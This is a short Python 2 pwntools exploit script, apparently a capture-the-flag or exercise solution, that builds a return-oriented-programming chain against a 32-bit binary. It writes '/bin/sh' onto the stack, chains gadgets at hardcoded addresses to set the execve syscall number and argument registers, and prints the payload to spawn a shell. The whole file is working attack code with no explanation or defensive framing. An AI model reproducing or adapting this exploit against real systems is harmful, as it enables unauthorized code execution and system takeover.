#!/usr/env/python python2
from pwn import *



#0x080e001f: add ebx, dword ptr [ecx]; add dword ptr [edx], ecx; ret; 
ADD_AECX_EBX=p32(0x080e001f)
#0x0806eb00: pop edx; pop ecx; pop ebx; ret;
POP_ALL=p32(0x0806eb00)

POPEAX=p32(0x080bb236)
#0x0806eb01: pop ecx; pop ebx; ret;
POPECX=p32(0x0806eb01)
#0x0806eada: pop edx; ret; 
POPEDX=p32(0x0806eada)
STACK =p32(0xffffcbdc)
PUSHESP=p32(0x080bb246)
MOVISTACK=p32(0x0809a54d)


dummy= "A"*4
#bin_sh=p32(0xffffca30)

buff  = "/bin/sh\0"
buff += dummy

buff += POPEDX
buff += STACK
#buff += POPEAX
#buff += p32(0xffffcb31)		#string "/bin/sh"
buff += MOVISTACK

buff += POPEDX
buff += p32(0xffffcbe0)
buff += POPEAX
buff += p32(0xffffcbe8) 
buff += MOVISTACK

buff += p32(0x080543e0)         # %eax is put to zero.
buff += p32(0x0807b52f) * 11    # %eax is now 0xb
#buff += p32(0x0806eb00)         # last pop
buff +=POPECX
buff += p32(0xffffcbdc)         # ecx char **arguments
buff += p32(0x00000000)
buff += ADD_AECX_EBX
buff += POPEDX
buff += p32(0xffffcbe8)         # edx char *env

#buff += bin_sh         	# ebx "/bin/sh"
buff += p32(0x080493e1)         # we execute
buff += p32(0x804e700)		# exit

print buff
